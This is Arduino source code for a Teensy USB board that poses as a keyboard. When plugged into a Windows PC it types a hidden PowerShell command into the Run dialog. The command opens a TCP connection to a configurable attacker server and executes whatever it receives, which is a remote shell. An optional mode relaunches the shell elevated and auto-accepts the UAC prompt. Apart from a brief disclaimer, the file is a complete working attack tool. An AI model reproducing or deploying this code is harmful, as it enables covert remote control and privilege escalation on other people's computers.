// ,- Author & Credits -> : TDiff; Thanks to Offensive Security (Peensy)
// `--------------------> : for the ideas, samratashok (tiny TCP Client)

// -- Purpose ----------> : Penetration Testing Tool for Windows 7 => 10
// -- Tested Platforms -> : Windows 7 x86, Windows 8 x64, Windows 10 x64

// ,- Hardware ---------> : Required : - A Teensy board  (2.0 up to 3.6)
// `--------------------> : Optional : - 3 Buttons to set options easily
// `--------------------> :            - 1 button to reset w/o rebooting

// ,- Disclaimer -------> : I'm not liable for any missuses of this code
// `--------------------> : ############################################
// `--------------------> : ##      INTENDED FOR LEGAL USE ONLY       ##
// `--------------------> : ############################################

 /////////////
// Config  /////////////////////////////////////////////////
String sAddr = "0.0.0.0";     // TCP Server Address       //   
String sPort = "1337";        // TCP Server Port          //
String sEnc  = "UTF8";        // Encoding used            //
bool   bUAC  = false;         // Using UAC prompt accept? //
int    iMs   = 1000;          // Delay in milliseconds    //
////////////////////////////////////////////////////////////

// Pin numbers
unsigned int iLedPin     = 13;
unsigned int iButtonPin3 = 12;
unsigned int iButtonPin2 = 11;
unsigned int iButtonPin1 = 10;
unsigned int iResetPin   = 0;

// LED feedback function
void ledBlink(int reps,int iDelay) {
  for(int i = 0; i<reps; i++) { 
    digitalWrite(iLedPin, HIGH); delay(iDelay); 
    digitalWrite(iLedPin, LOW); delay(iDelay);
  }
}

// Press key(s) and unpress it/them
void pressKey(unsigned int iKey, unsigned int iModifier = 0) {
  Keyboard.set_modifier(iModifier);
  Keyboard.set_key1(iKey);
  Keyboard.send_now();
  delay(50);
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(50);
}

// NUM, SCROLL, CAPS Led keys checking. 
bool isScrollOn (void) { return ((int(keyboard_leds)& 4) == 4) ? true : false; }
bool isCapsOn   (void) { return ((int(keyboard_leds)& 2) == 2) ? true : false; }
bool isNumOn    (void) { return ((int(keyboard_leds)& 1) == 1) ? true : false; }

// Turn SCROLL / CAPS Lock off
bool scrollOff  (void) { if (isScrollOn()) { pressKey(KEY_SCROLL_LOCK); return true; } return false; }
bool capsOff    (void) { if (isCapsOn())   { pressKey(KEY_CAPS_LOCK);   return true; } return false; }


// Wait for Windows to be ready before we start typing.
void waitForDrivers() {
  bool bInitialState = isScrollOn();
  while(bInitialState == isScrollOn()) { pressKey(KEY_SCROLL_LOCK); }
  scrollOff(); capsOff();
}

void setup() {
  
  // Init pin modes
  pinMode (iLedPin  , OUTPUT);
  pinMode (iButtonPin1, INPUT_PULLUP);
  pinMode (iButtonPin2, INPUT_PULLUP);
  pinMode (iButtonPin3, INPUT_PULLUP);
  pinMode (iResetPin, INPUT_PULLUP);
  
  digitalWrite(iLedPin, LOW); 
 
  // Is windows ready?
  waitForDrivers(); 

  // Wait for something to do
  while (!digitalRead(iButtonPin1)) { ledBlink(1,50); }

  // Admin mode
  if (digitalRead(iButtonPin3)) { bUAC = true; }

  // Prepare the PowerhShell TCP Client
  String sPowerShellCmd = "powershell -w 1 "; 
  if (bUAC) { sPowerShellCmd += "saps powershell -A '-NoE -W 1',{"; }  
  sPowerShellCmd += "$u=(New-Object Net.Sockets.TCPClient('" + sAddr + "'," + sPort + ")).GetStream();[byte[]]$w=0..64KB|%{0};";
  sPowerShellCmd += "while(($i=$u.Read($w,0,$w.Length))-ne0){$d=([text.encoding]::UTF8).GetString($w,0,$i);(iex $d)}";
  if (bUAC) { sPowerShellCmd += "} -Verb runAs"; }

  // Open Windows + R
  pressKey(KEY_R, MODIFIERKEY_LEFT_GUI);
  delay(iMs);

  // Launch the TCP Client 
  Keyboard.println(sPowerShellCmd);

  // If admin mode
  if (bUAC) {
    // Wait for the button push
    while (!digitalRead(iButtonPin2)) { ledBlink(1,50); }
  
    // Accept UAC prompt
    pressKey(KEY_LEFT);
    pressKey(KEY_ENTER); 
  }
}

void loop() {

  // Tell the agent it's done
  digitalWrite(iLedPin, HIGH);

  // If the reset pin is triggered restart the setup
  if (digitalRead(iResetPin)) { setup(); }
  
  delay(50); // Don't waste too much CPU cycles
  
}
